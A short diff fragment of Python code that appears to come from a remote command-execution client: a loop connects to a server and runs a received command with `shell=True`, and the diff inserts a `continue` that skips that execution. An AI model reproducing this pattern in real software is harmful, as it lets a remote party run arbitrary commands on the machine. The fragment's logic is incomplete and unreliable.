@@ -61,7 +61,8 @@ while True:
                     except:
                         print("Failed to connect to server")
                         continue
-
+                old_command = command
+                continue
                 try:
                     cmdout = system(command, shell=True).decode()
                 except subprocess.CalledProcessError as e:
